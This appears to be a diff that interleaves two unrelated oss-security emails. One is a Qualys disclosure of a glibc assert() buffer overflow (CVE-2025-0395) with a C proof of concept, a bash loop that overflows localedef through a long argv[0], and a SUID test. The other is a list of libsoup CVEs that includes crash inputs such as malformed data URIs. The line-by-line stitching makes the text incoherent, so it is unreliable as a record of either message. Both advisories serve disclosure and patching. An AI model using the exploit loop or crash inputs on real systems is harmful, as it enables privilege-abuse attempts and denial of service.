+ =?utf-8?B?SXNUSTl3bmhpSi96b0pSTEdPSzc0NjRNcXNrdzV4czkzZjFaTVhCVk80MTBC?=
+ =?utf-8?B?S2xJeWxEczFCRHFQcS9zalVuR0hTRWZScVpYNDdhcnhpSHFOcjlvUVFDZ1pa?=
+ =?utf-8?B?eklZV01oU1N5NjBmRHI0LzBKRnBIYzVjWFdGcDNiMjJuUzl4MUd4SXRObmhP?=
+ =?utf-8?B?TklRcnV6N21hYVZSeVRNK3krWTFaNklydVFQK3FYWmVBWktOeHNWWk1mZUJo?=
+ =?utf-8?B?NTZiTXRydW9oSzhRRGlUVTE2Y1EwU3pwUzM2d3prbDNwaGtqWGpiK3dqaFpm?=
+ =?utf-8?B?SUY3Wk9BN1A4Y3JIVHRLcGZSM0wrWmx6bTlsMm5Ed0pQNHY2RHRoTFROM3pz?=
+ =?utf-8?B?WUxZSXhkVVhpWExFTjlJaG50UzhVMzQ0aFhhRnowcVpHODN2bkJkTFgwOHpu?=
+ =?utf-8?B?RzBpc1RSaHdPQXZWMGNTcHNhWmNhWVBVc2Nwc0dZNDEwSXgwTFI5SW9wdm1Y?=
+ =?utf-8?B?TWc9PQ==?=
+X-MS-Exchange-AntiSpam-ExternalHop-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-ExternalHop-MessageData-0:
+	ejFY4aF8ZWipWk6jRpcGOSNbL4ZhOvmYYiHTvCwG+j+snD+2EvqhG0Q6468tG6oX6bXGSR/crD0YhHjhcox5atV0kv4b6CE3fmuJy+EXeCW9Oahpq3zSj6p3STbf5eonplEVyY5eAc7Z2fKGlNBBzF9hOy48wx2Wcn5AVupvzcTUUf4+0KbWTo0ZTFPO6jlwN1Ooz4azRBj0Yp/QKgvQERc2bi9H5TyXZKjHmiTYVPXx9xqpCtqCgX19Vg/SC6LSu+NdUErxNXmCAj0fkljM3AmmqQ+mow3KxOilE2y7RZ655x1nCYjs2FooDV3OY74AHF4UXgRhYaRtqvgDJSlJl3NLSzoIKRozW+OiL7oiCfg/6nsvVODE3G5kRQi55uXLEV33KFchu62qNTs7xkz6z9f0ldl6XHd7ZKMvqgdRzT9/9HnYdzOMAeD9/gNJRwxYBuf8gmGYnW2FHdINKAbACfrzTD02kWlpwEUVShLOAWVXfyuwCEU7gQ4tpuFHasISqM/yrckuu/13cobqldmdFJH+da3XF4KOfM4paF5jO7uWPnvLMFcGVOC+AwPm2AGkAfd0lJMt6yTOi/oqyZaMHYyCEiTzG/uglOqAAc8hlBo=
+X-OriginatorOrg: oracle.com
+X-MS-Exchange-CrossTenant-Network-Message-Id: f38b1ac9-0484-4fae-71b2-08dd7eaa8786
+X-MS-Exchange-CrossTenant-AuthSource: DS7PR10MB5005.namprd10.prod.outlook.com
 X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-AuthSource: SJ0PR06MB6910.namprd06.prod.outlook.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: ce5914bf-b058-437b-a7cc-08dd3aea7e08
-X-MS-Exchange-CrossTenant-originalarrivaltime: 22 Jan 2025 13:41:36.7210
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 18 Apr 2025 18:55:04.1463
  (UTC)
-X-MS-Exchange-CrossTenant-fromentityheader: Hosted
-X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
-X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
-X-MS-Exchange-CrossTenant-userprincipalname: CRAyZ7U9iAJWpIBabNs3cj1vaZjNUPz++Wici8TRXtzR/Vz4nPECHsXHNFm81b2roQ/Coj+H17M/AxV7MKquaRJ1nqUATlztM7Q3DFfKPSk=
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: BY5PR06MB6499
+X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
+X-MS-Exchange-CrossTenant-Id: 4e2c6054-71cb-48f1-bd6c-3a9705aca71b
+X-MS-Exchange-CrossTenant-MailboxType: HOSTED
+X-MS-Exchange-CrossTenant-UserPrincipalName: TPiyq06tbset84FD+KzcJLRB9V+piFja3c95TbDvjIbi1xxZIuAx0wggqbqcjOWzZk1WX++BllYe21bzV7uM1bGlyFfFLnkBpt910sg2FDs=
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: IA1PR10MB6097
 X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.272,Aquarius:18.0.1057,Hydra:6.0.680,FMLib:17.12.68.34
- definitions=2025-01-22_06,2025-01-22_02,2024-11-22_01
-Subject: [oss-security] CVE-2025-0395: Buffer overflow in the GNU C Library's assert()
+ engine=ICAP:2.0.293,Aquarius:18.0.1095,Hydra:6.0.680,FMLib:17.12.68.34
+ definitions=2025-04-18_07,2025-04-17_01,2024-11-22_01
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 mlxscore=0 bulkscore=0 malwarescore=0
+ mlxlogscore=999 phishscore=0 suspectscore=0 spamscore=0 adultscore=0
+ classifier=spam adjust=0 reason=mlx scancount=1 engine=8.12.0-2502280000
+ definitions=main-2504180143
+X-Proofpoint-ORIG-GUID: exBllIY-T6LLanSlP7ajR3sdrRPZO9Hg
+X-Proofpoint-GUID: exBllIY-T6LLanSlP7ajR3sdrRPZO9Hg
+Subject: [oss-security] A bowlful of bugs in GNOME's libsoup
 
---_002_20250122134128GA29327localhostlocaldomain_
-Content-Type: text/plain; charset="us-ascii"
-Content-ID: <5A0C8532D4F146479BC8A1401568CE2D@namprd06.prod.outlook.com>
-Content-Transfer-Encoding: quoted-printable
+libsoup is an HTTP client/server library for GNOME, hosted at
+https://gitlab.gnome.org/GNOME/libsoup
 
-Hi all,
+A number of CVE's have recently been recorded against it (due in part to
+bug bounty submissions via YesWeHack) - fixes are available in the
+libsoup 3.6.x releases for some, but not all of them.
 
-On January 10, 2025, we contacted the GNU C Library's security team
-about a buffer overflow that we discovered in assert()'s implementation
-(CVE-2025-0395). Because this vulnerability seems relatively minor (for
-reasons detailed below), it was decided that it could be discussed and
-patched publicly, without an embargo.
+Some fixes that also affect the older 2.x branch have been backported upstream
+in https://gitlab.gnome.org/GNOME/libsoup/-/merge_requests/449 though upstream
+encourages migration to version 3.x instead if possible.
 
-Today (January 22, 2025) a Bugzilla entry and a patch proposal for this
-vulnerability have been published:
+CVE-2025-32049 - https://gitlab.gnome.org/GNOME/libsoup/-/issues/390
 
-  https://sourceware.org/bugzilla/show_bug.cgi?id=3D32582
-  https://patchwork.sourceware.org/project/glibc/list/?series=3D43300
-  https://sourceware.org/pipermail/libc-alpha/2025-January/164164.html
-  https://sourceware.org/pipermail/libc-alpha/2025-January/164165.html
-  https://sourceware.org/pipermail/libc-alpha/2025-January/164166.html
+     Denial of service on libsoup via soup-websocket-connection through
+     "process_contents" leads to unbounded memory allocation when receiving
+     fragmented websocket messages
 
-For more details and a proof of concept, below are the two emails that
-we sent to the GNU C Library's security team. We are of course at your
-disposal for questions, comments, and further discussions. Thank you
-very much!
+     YesWeHack Report ID: #YWH-PGM9867-12
+     Date Reported on GNOME GitLab: August 21, 2024 (#390)
+     Date Reported on YesWeHack: November 25, 2024
+     Date Fixed: Not Fixed
+     Fix Version: Not Fixed
+     Fix: Not Fixed
+     CVE: CVE-2025-32049
+     CWE: CWE-617: Reachable Assertion, CWE-770: Allocation of Resources Without Limits or Throttling
+     Discovery Credit: Ignacio Casal Quinteiro
+     Additional Discovery Credit: Jan Różański
+     Additional Thanks: Sovereign Tech Resilience program of the Sovereign Tech Agency
 
-With best regards,
--- the Qualys Security Advisory team
+     The websocket protocol allows sending a large message in small
+     chunks called frames. The problem in libsoup's implementation of
+     this feature, is that there is no restriction on the total length
+     of a fragmented message sent through multiple frames. Every time a
+     message fragment is received, the message_data buffer is
+     expanded. The problem arises when client never terminates his
+     message, and keeps sending message fragments. The outcome is that
+     the receiving process terminates with an error once the buffer's
+     size gets too big:
 
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+     (process:26989): GLib-ERROR **: 17:39:20.346: adding 98303 to array would overflow
+     Trace/breakpoint trap (core dumped)
 
-While looking into commit 6f0ea84 ("assert: Remove the use of %n from
-__assert_fail_base (BZ #32456)"), we spotted an mmap-based buffer
-overflow in assert() (more precisely, in __assert_fail_base()),
-introduced in 2011 by commit f8a3b5b ("Use mmap for allocation of
-buffers used for __abort_msg"):
+     The issue originates in process_contents function in
+     soup-websocket-connection.c when dealing with priv->message_data.
 
-------------------------------------------------------------------------
-356 struct abort_msg_s
-357 {
-358   unsigned int size;
-359   char msg[0];
-360 };
-------------------------------------------------------------------------
- 68       total =3D (total + 1 + GLRO(dl_pagesize) - 1) & ~(GLRO(dl_pagesiz=
-e) - 1);
- 69       struct abort_msg_s *buf =3D __mmap (NULL, total, PROT_READ | PROT=
-_WRITE,
- 70                                         MAP_ANON | MAP_PRIVATE, -1, 0);
- 71       if (__glibc_likely (buf !=3D MAP_FAILED))
- 72         {
- 73           buf->size =3D total;
- 74           strcpy (buf->msg, str);
-------------------------------------------------------------------------
+     Proposed fix (not yet accepted/merged):
+     https://gitlab.gnome.org/GNOME/libsoup/-/merge_requests/408
 
-- at lines 68-70, a buffer buf is mmap()ed for a copy of the string str
-  and its terminating null byte (total + 1 bytes), plus possible padding
-  (to a multiple of the page size);
+CVE-2025-32050 - https://gitlab.gnome.org/GNOME/libsoup/-/issues/424
 
-- but at line 73, an extra, unaccounted-for unsigned int (size) is also
-  written into this mmap()ed buf;
+     Integer overflow in append_param_quoted
 
-- so at line 74, the strcpy() overflows buf with the last bytes of str
-  (an off-by-one, two, three, or four bytes (the sizeof unsigned int),
-  depending on the padding size).
+     YesWeHack Report ID: #YWH-PGM9867-9
+     Date Reported: October 28, 2024
+     Date Fixed: November 22, 2024
+     Fix Version: 3.6.1
+     Fix: 9bb0a55d
+     CVE: CVE-2025-32050
+     CWE: CWE-127: Buffer Under-read, CWE-190: Integer Overflow
+     Discovery Credit: chamal de silva
+     Additional Thanks: Sovereign Tech Resilience program of the Sovereign Tech Agency
 
-Because the string str includes __progname (the basename() of argv[0]),
-a local attacker can ensure that the padding at line 68 is minimal and
-can overflow the buffer buf at line 74 (and this works even against a
-SUID program that contains an assertion failure). Exploitation of this
-vulnerability looks difficult, but cannot be ruled out completely:
+     The likely impact of this bug is denial of service. Since there is buffer
+     under-read, there is also theoretical confidentiality impact. [Triager]
+     thinks buffer underwrite might also be possible, but is not certain.
 
-- a SUID program that contains a reachable assertion failure is needed;
+     The libsoup function append_param_quoted is vulnerable to an Integer
+     Overflow.
 
-- the buffer overflow is mmap-based, and at most an off-by-four bytes;
+CVE-2025-32051 - https://gitlab.gnome.org/GNOME/libsoup/-/issues/401
 
-- the attacker does not control the four bytes that overflow the buffer;
+     Segmentation fault when parsing malformed data URI
 
-- the program is about to die (assert() calls abort(), eventually).
+     YesWeHack Report ID: #YWH-PGM9867-11
+     Date Reported to YesWeHack: November 21, 2024
+     Date Fixed: November 22, 2024
+     Fix Version: 3.6.1
+     Fix: 0713ba4a and 79cfd65c
+     CVE: CVE-2025-32051
+     CWE: NULL Pointer Dereference (CWE-476)
+     Discovery Credit: Anonymous
+     Additional Thanks: Sovereign Tech Resilience program of the Sovereign Tech Agency
+     (This anonymous discovery credit is in addition to Ar jun.)
 
-Important note: __libc_message_impl() in sysdeps/posix/libc_fatal.c is
-also vulnerable to a very similar buffer overflow.
+     libsoup's soup_uri_decode_data_uri() function, prior to libsoup 3.6.1, may
+     crash when processing a malformed data URI, resulting in denial of service.
 
-To validate our findings, we first used the following proof of concept:
+     Report summary: Using a custom fuzzing harness, I discovered that these
+     two payloads both trigger a segmentation fault in
+     soup_uri_decode_data_uri(uri, NULL): data:.///, data:/.//
 
-------------------------------------------------------------------------
-$ cat > poc.c << "EOF"
-#include <assert.h>
-int
-main(const int argc, const char * const argv[])
-{
-    assert(argc < 3);
-    return 0;
-}
-EOF
+CVE-2025-32052 - https://gitlab.gnome.org/GNOME/libsoup/-/issues/425
 
-$ gcc -o poc poc.c
+     Heap buffer over-read in soup-content-sniffer.c:sniff_unknown()
 
-$ ./poc one two
-poc: poc.c:5: main: Assertion `argc < 3' failed.
-Aborted
+     Date Reported: November 14, 2024
+     Date Fixed: November 22, 2024
+     Fix Version: 3.6.1
+     Fix: f182429e
+     CVE: CVE-2025-32052
+     CWE: CWE-126: Buffer Over-read
+     Discovery Credit: Ar jun
 
-$ wc << "EOF"
-: poc.c:5: main: Assertion `argc < 3' failed.
-EOF
-      1       8      46
+     libsoup prior to version 3.6.1 is vulnerable to a heap buffer over-read
+     in the content sniffer's sniff_unknown() function. libsoup clients may
+     read out of bounds in response to a crafted HTTP response sent by an
+     HTTP server.
 
-$ while true; do
-    P=3D"$(((1 + RANDOM % 32) * 4096))"
-    L=3D"$((P - (46 + 1)))"
-    A=3D"$(perl -e "print 'a' x $L")"
-    (exec -a "$A" ./poc one two 2>/dev/null)
-    if test "$?" -ne "$((128 + 6))"; then
-        echo "$L"
-        break
-    fi
-done
+CVE-2025-32053 - https://gitlab.gnome.org/GNOME/libsoup/-/issues/426
 
-Aborted
-Aborted
-Aborted
-Aborted
-Aborted
-Aborted
-Aborted
-Aborted
-Segmentation fault
-94161
-------------------------------------------------------------------------
+     Heap buffer over-read in soup-content-sniffer.c:sniff_feed_or_html()
+     and soup-content-sniffer.c:skip_insignificant_space()
 
-Next, to validate these findings in a more realistic scenario, we
-searched for an assertion failure in one of the programs that are
-installed by default on Linux; we found one in localedef, which is not
-SUID but is part of the glibc itself ("./fi_FI", which is attached to
-this email, is a modified version of the example in "man localedef"):
+     Date Reported: November 14, 2024
+     Date Fixed: November 22, 2024
+     Fix Version: 3.6.1
+     Fix: eaed42ca
+     CVE: CVE-2025-32053
+     CWE: CWE-126: Buffer Over-read
+     Discovery Credit: Ar jun
 
-------------------------------------------------------------------------
-$ /usr/bin/localedef -f UTF-8 -i ./fi_FI ./fi_FI.UTF-8
-[warning] No definition for LC_CTYPE category found
-[warning] No definition for LC_NUMERIC category found
-[warning] No definition for LC_TIME category found
-localedef: programs/ld-collate.c:1886: collate_finish: Assertion `ruleidx <=
-=3D 128' failed.
-Aborted
+     libsoup prior to version 3.6.1 is vulnerable to heap buffer over-reads in
+     the content sniffer's sniff_feed_or_html() and skip_insignificant_space()
+     functions. libsoup clients may read out of bounds in response to a
+     crafted HTTP response sent by an HTTP server.
 
-$ wc << "EOF"
-: programs/ld-collate.c:1886: collate_finish: Assertion `ruleidx <=3D 128' =
-failed.
-EOF
-      1       8      81
+     WARNING: the fix for this issue possibly introduces another security
+     vulnerability, #422 (closed).
 
-$ while true; do
-    P=3D"$(((1 + RANDOM % 32) * 4096))"
-    L=3D"$((P - (81 + 1)))"
-    A=3D"$(perl -e "print 'a' x $L")"
-    (exec -a "$A" localedef -f UTF-8 -i ./fi_FI ./fi_FI.UTF-8 2>/dev/null)
-    if test "$?" -ne "$((128 + 6))"; then
-        echo "$L"
-        break
-    fi
-done
+CVE-2025-32906 - https://gitlab.gnome.org/GNOME/libsoup/-/issues/404
 
-Aborted
-Aborted
-Aborted
-Aborted
-Aborted
-Aborted
-Aborted
-Aborted
-Aborted
-Aborted
-Segmentation fault
-85934
-------------------------------------------------------------------------
+     Out of bounds reads in soup_headers_parse_request()
 
-Last, to double-check that this attack also works even against a SUID
-program, we temporarily set the SUID bit of localedef:
+     Date Reported: November 25, 2024
+     Date Fixed: February 24, 2025
+     Fix Version: 3.6.5
+     Fix: https://gitlab.gnome.org/GNOME/libsoup/-/merge_requests/440
+     CVE: CVE-2025-32906
+     Discovery Credit: Tan Wei Chong
 
-------------------------------------------------------------------------
-# chmod u+s /usr/bin/localedef
-------------------------------------------------------------------------
-$ while true; do
-    P=3D"$(((1 + RANDOM % 32) * 4096))"
-    L=3D"$((P - (81 + 1)))"
-    A=3D"$(perl -e "print 'a' x $L")"
-    (exec -a "$A" localedef -f UTF-8 -i ./fi_FI ./fi_FI.UTF-8 2>/dev/null)
-    if test "$?" -ne "$((128 + 6))"; then
-        echo "$L"
-        break
-    fi
-done
+CVE-2025-32907 - https://gitlab.gnome.org/GNOME/libsoup/-/issues/428
 
-Aborted
-Aborted
-Aborted
-Aborted
-Aborted
-Aborted
-Aborted
-Aborted
-Aborted
-Aborted
-Segmentation fault
-44974
-------------------------------------------------------------------------
-# chmod u-s /usr/bin/localedef
-------------------------------------------------------------------------
+     Denial of service in server when client requests a large amount of
+     overlapping ranges with Range header
 
-As we are currently working on several other projects in parallel, we
-have not tried to find a real-world vulnerable SUID program.
+     YesWeHack Report ID: #YWH-PGM9867-13
+     Date Reported: November 28, 2024
+     Date Fixed: Not Fixed
+     Fix Version: Not Fixed
+     Fix: Not Fixed
+     CVE: CVE-2025-32907
+     CWE: CWE-405: Asymmetric Resource Consumption (Amplification)
+     Discovery Credit: Jan Różański
+     Additional Thanks: Sovereign Tech Resilience program of the Sovereign Tech Agency
 
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+     libsoup's implementation of HTTP range requests is vulnerable to a
+     resource consumption attack. A malicious client may request the same
+     range many times in a single HTTP request, causing the server to use
+     large amounts of memory.
 
-Just a quick update:
+CVE-2025-32908 - https://gitlab.gnome.org/GNOME/libsoup/-/issues/429
 
-On Fri, Jan 10, 2025 at 11:01:12PM +0000, Qualys Security Advisory wrote:
-> Important note: __libc_message_impl() in sysdeps/posix/libc_fatal.c is
-> also vulnerable to a very similar buffer overflow.
+     Denial of service on libsoup through
+     server/http2/soup-server-message-io-http2.c via "on_frame_recv_callback"
+     due to assertion failure when client sends certain values in
+     pseudo-headers in a HEADERS frame
 
-Although __libc_message() is in theory vulnerable to the same buffer
-overflow as assert(), we double-checked and __libc_message()'s callers
-(__libc_fatal(), __fortify_fail(), malloc_printerr(), and assert()s that
-are internal to the glibc) never include attacker-controlled or long-
-enough strings to trigger this buffer overflow in practice (it should
-probably still be fixed, however).
+     YesWeHack Report ID: #YWH-PGM9867-14
+     Date Reported: December 1, 2024
+     Date Fixed: Not Fixed
+     Fix Version: Not Fixed
+     Fix: Not Fixed
+     CVE: CVE-2025-32908
+     CWE: CWE-617: Reachable Assertion
+     Discovery Credit: Jan Różański
+     Additional Thanks: Sovereign Tech Resilience program of the Sovereign Tech Agency
 
-So only assert() calls that come from outside the glibc are vulnerable
-to this buffer overflow (because __progname is attacker-controlled).
+     libsoup's HTTP/2 server doesn't fully validate the values of the
+     pseudo-headers :scheme, :authority, and :path.
+     A client may crash the server by sending a malicious HTTP request.
 
+CVE-2025-32909 - https://gitlab.gnome.org/GNOME/libsoup/-/issues/431
 
---_002_20250122134128GA29327localhostlocaldomain_
-Content-Type: text/plain; name="fi_FI"
-Content-Description: fi_FI
-Content-Disposition: attachment; filename="fi_FI"; size=14759;
-	creation-date="Wed, 22 Jan 2025 13:41:36 GMT";
-	modification-date="Wed, 22 Jan 2025 13:41:36 GMT"
-Content-ID: <461F4FADB7030D47BE6ED890DE406433@namprd06.prod.outlook.com>
-Content-Transfer-Encoding: base64
+     NULL Pointer Dereference on libsoup through function "sniff_mp4"
+     in soup-content-sniffer.c
 
-Y29tbWVudF9jaGFyICUNCmVzY2FwZV9jaGFyIC8NCg0KTENfQ09MTEFURQ0Kc2VjdGlvbi1zeW1i
-b2wgPFhYWDE+DQpzZWN0aW9uLXN5bWJvbCA8WFhYMj4NCnNlY3Rpb24tc3ltYm9sIDxYWFgzPg0K
-c2VjdGlvbi1zeW1ib2wgPFhYWDQ+DQpzZWN0aW9uLXN5bWJvbCA8WFhYNT4NCnNlY3Rpb24tc3lt
-Ym9sIDxYWFg2Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDc+DQpzZWN0aW9uLXN5bWJvbCA8WFhYOD4N
-CnNlY3Rpb24tc3ltYm9sIDxYWFg5Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDEwPg0Kc2VjdGlvbi1z
-eW1ib2wgPFhYWDExPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDEyPg0Kc2VjdGlvbi1zeW1ib2wgPFhY
-WDEzPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDE0Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDE1Pg0Kc2Vj
-dGlvbi1zeW1ib2wgPFhYWDE2Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDE3Pg0Kc2VjdGlvbi1zeW1i
-b2wgPFhYWDE4Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDE5Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDIw
-Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDIxPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDIyPg0Kc2VjdGlv
-bi1zeW1ib2wgPFhYWDIzPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDI0Pg0Kc2VjdGlvbi1zeW1ib2wg
-PFhYWDI1Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDI2Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDI3Pg0K
-c2VjdGlvbi1zeW1ib2wgPFhYWDI4Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDI5Pg0Kc2VjdGlvbi1z
-eW1ib2wgPFhYWDMwPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDMxPg0Kc2VjdGlvbi1zeW1ib2wgPFhY
-WDMyPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDMzPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDM0Pg0Kc2Vj
-dGlvbi1zeW1ib2wgPFhYWDM1Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDM2Pg0Kc2VjdGlvbi1zeW1i
-b2wgPFhYWDM3Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDM4Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDM5
-Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDQwPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDQxPg0Kc2VjdGlv
-bi1zeW1ib2wgPFhYWDQyPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDQzPg0Kc2VjdGlvbi1zeW1ib2wg
-PFhYWDQ0Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDQ1Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDQ2Pg0K
-c2VjdGlvbi1zeW1ib2wgPFhYWDQ3Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDQ4Pg0Kc2VjdGlvbi1z
-eW1ib2wgPFhYWDQ5Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDUwPg0Kc2VjdGlvbi1zeW1ib2wgPFhY
-WDUxPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDUyPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDUzPg0Kc2Vj
-dGlvbi1zeW1ib2wgPFhYWDU0Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDU1Pg0Kc2VjdGlvbi1zeW1i
-b2wgPFhYWDU2Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDU3Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDU4
-Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDU5Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDYwPg0Kc2VjdGlv
-bi1zeW1ib2wgPFhYWDYxPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDYyPg0Kc2VjdGlvbi1zeW1ib2wg
-PFhYWDYzPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDY0Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDY1Pg0K
-c2VjdGlvbi1zeW1ib2wgPFhYWDY2Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDY3Pg0Kc2VjdGlvbi1z
-eW1ib2wgPFhYWDY4Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDY5Pg0Kc2VjdGlvbi1zeW1ib2wgPFhY
-WDcwPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDcxPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDcyPg0Kc2Vj
-dGlvbi1zeW1ib2wgPFhYWDczPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDc0Pg0Kc2VjdGlvbi1zeW1i
-b2wgPFhYWDc1Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDc2Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDc3
-Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDc4Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDc5Pg0Kc2VjdGlv
-bi1zeW1ib2wgPFhYWDgwPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDgxPg0Kc2VjdGlvbi1zeW1ib2wg
-PFhYWDgyPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDgzPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDg0Pg0K
-c2VjdGlvbi1zeW1ib2wgPFhYWDg1Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDg2Pg0Kc2VjdGlvbi1z
-eW1ib2wgPFhYWDg3Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDg4Pg0Kc2VjdGlvbi1zeW1ib2wgPFhY
-WDg5Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDkwPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDkxPg0Kc2Vj
-dGlvbi1zeW1ib2wgPFhYWDkyPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDkzPg0Kc2VjdGlvbi1zeW1i
-b2wgPFhYWDk0Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDk1Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDk2
-Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDk3Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDk4Pg0Kc2VjdGlv
-bi1zeW1ib2wgPFhYWDk5Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDEwMD4NCnNlY3Rpb24tc3ltYm9s
-IDxYWFgxMDE+DQpzZWN0aW9uLXN5bWJvbCA8WFhYMTAyPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDEw
-Mz4NCnNlY3Rpb24tc3ltYm9sIDxYWFgxMDQ+DQpzZWN0aW9uLXN5bWJvbCA8WFhYMTA1Pg0Kc2Vj
-dGlvbi1zeW1ib2wgPFhYWDEwNj4NCnNlY3Rpb24tc3ltYm9sIDxYWFgxMDc+DQpzZWN0aW9uLXN5
-bWJvbCA8WFhYMTA4Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDEwOT4NCnNlY3Rpb24tc3ltYm9sIDxY
-WFgxMTA+DQpzZWN0aW9uLXN5bWJvbCA8WFhYMTExPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDExMj4N
-CnNlY3Rpb24tc3ltYm9sIDxYWFgxMTM+DQpzZWN0aW9uLXN5bWJvbCA8WFhYMTE0Pg0Kc2VjdGlv
-bi1zeW1ib2wgPFhYWDExNT4NCnNlY3Rpb24tc3ltYm9sIDxYWFgxMTY+DQpzZWN0aW9uLXN5bWJv
-bCA8WFhYMTE3Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDExOD4NCnNlY3Rpb24tc3ltYm9sIDxYWFgx
-MTk+DQpzZWN0aW9uLXN5bWJvbCA8WFhYMTIwPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDEyMT4NCnNl
-Y3Rpb24tc3ltYm9sIDxYWFgxMjI+DQpzZWN0aW9uLXN5bWJvbCA8WFhYMTIzPg0Kc2VjdGlvbi1z
-eW1ib2wgPFhYWDEyND4NCnNlY3Rpb24tc3ltYm9sIDxYWFgxMjU+DQpzZWN0aW9uLXN5bWJvbCA8
-WFhYMTI2Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDEyNz4NCnNlY3Rpb24tc3ltYm9sIDxYWFgxMjg+
-DQpzZWN0aW9uLXN5bWJvbCA8WFhYMTI5Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDEzMD4NCnNlY3Rp
-b24tc3ltYm9sIDxYWFgxMzE+DQpzZWN0aW9uLXN5bWJvbCA8WFhYMTMyPg0Kc2VjdGlvbi1zeW1i
-b2wgPFhYWDEzMz4NCnNlY3Rpb24tc3ltYm9sIDxYWFgxMzQ+DQpzZWN0aW9uLXN5bWJvbCA8WFhY
-MTM1Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDEzNj4NCnNlY3Rpb24tc3ltYm9sIDxYWFgxMzc+DQpz
-ZWN0aW9uLXN5bWJvbCA8WFhYMTM4Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDEzOT4NCnNlY3Rpb24t
-c3ltYm9sIDxYWFgxNDA+DQpzZWN0aW9uLXN5bWJvbCA8WFhYPg0KDQpzY3JpcHQgPEhBTj4NCm9y
